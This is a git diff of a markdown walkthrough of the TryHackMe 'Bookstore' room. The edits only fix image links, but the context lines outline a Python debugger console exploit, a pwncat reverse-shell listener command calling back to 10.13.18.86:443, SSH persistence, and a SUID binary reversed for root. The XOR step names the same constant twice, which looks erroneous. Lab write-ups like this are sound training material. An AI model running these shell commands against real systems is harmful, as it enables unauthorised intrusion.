@@ -1,6 +1,3 @@
-<p align="center">
-	<img src='https://tryhackme-images.s3.amazonaws.com/room-icons/aba19a5cfea503b401f5550cb1004e20.jpeg'/>
-</p>
 
 # Bookstore
 
@@ -82,14 +79,14 @@ ___
 ## Website Enumeration
 I will now begin enumerate the website on port 80 but first let's look at the homepage, also noting that it's an html file.
 
-![[80_enum.png]]
+![enum](80_enum.png)
 
 ___
 
 #### Burp Suite Proxy
 When I begin enumerating a website, I proxy my traffic through Burp Suite.
 
-![[burp.png]]
+![burp](burp.png)
 
 While browsing the source code on the Login page, theres an interesting comment that may leak a user name of  ```sid``` from the comment ```the debugger pin is inside sid's bash history file```. 
 
@@ -119,20 +116,20 @@ ___
 
 ```Gobuster``` running on port 5000 did find 3 possible resources api and console. At this time I will also add this target to Burp Suite.
 
-![[gobuster-5000.png]]
+![gb](gobuster-5000.png)
 
 ___
 #### Homepage
 
 The homepage shows **Foxy REST API v2.0** ```This is a REST API for science fiction novels```
 
-![[home.png]]
+![home](home.png)
 ___
 
 #### API Fuzzing
 Browsing to the api page allows us to view the documentation for the API. 
 
-![[api-fuzz.png]]
+![api-fuzz](api-fuzz.png)
 
 Fuzzing the api with ```curl```
 
@@ -274,7 +271,7 @@ ___
 ## Console Reverse shell
 
 Logging in to discover /console is an interactive python shell
-![[console.png]]
+![python shell](console.png)
 
 
 https://www.revshells.com/ makes it easy to grab a python reverse shell
@@ -291,7 +288,7 @@ pwncat -l 443 --self-inject /bin/bash:10.13.18.86:443
 
 Reverse shell is granted
 
-![[user-shell.png]]
+![user](user-shell.png)
 
 ___
 
@@ -323,7 +320,7 @@ The key's randomart image is:
 ```
 
 
-![[persistence.png]]
+![persitence](persistence.png)
 
 ___
 
@@ -344,7 +341,7 @@ sid  sid.pub  try-harder
 
 Using Ghidra to analyze the file. The program prompts for a number and XORs it with ```0x5db3``` and ```0x5db3``` and the result must match ```0x5dc21f4```. If the results are correct and root shell will be given via ```/bin/bash -p```.
 
-![[ghidra.png]]
+![ghidra](ghidra.png)
 
 Using python3 we can reverse the operation to get the Magic Number of 1573743953.
 
@@ -379,4 +376,4 @@ ___
 ## Extra
 Killing my ssh session and reverse shell, to opening my pwncat unbreakable shell
 
-![[extra.png]]
+![Extra](extra.png)
